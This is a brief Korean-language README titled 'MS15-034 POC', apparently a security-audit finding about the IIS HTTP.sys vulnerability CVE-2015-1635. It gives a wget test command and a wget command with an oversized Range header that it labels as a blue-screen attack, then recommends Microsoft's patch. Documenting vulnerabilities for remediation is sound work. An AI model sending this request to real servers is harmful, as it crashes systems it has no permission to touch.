# MS15-034
MS15-034 POC

"현재 IIS 서버 버전은 알려진 취약점(CVE-2015-1635, MS15-034)이 존재하는 취약한 버전으로 해당 취약점을 활용할 시 원격 코드 실행 혹은 블루스크린 유발 등의 공격에 당할 위험이 존재한다. 
 - 테스트 구문 : wget --header=""Range: bytes=0-18446744073709551615"" <테스트할 서버 URL>
 - 블루스크린 유발 공격 구문 : wget --header=""Range: bytes=18-18446744073709551615"" <공격할 서버 URL>

※ https://technet.microsoft.com/library/security/ms15-034
※ http://blog.alyac.co.kr/303"
"Windows Server 2012 R2 용 보안 패치를 설치한다.
https://www.microsoft.com/ko-KR/download/details.aspx?id=46500"
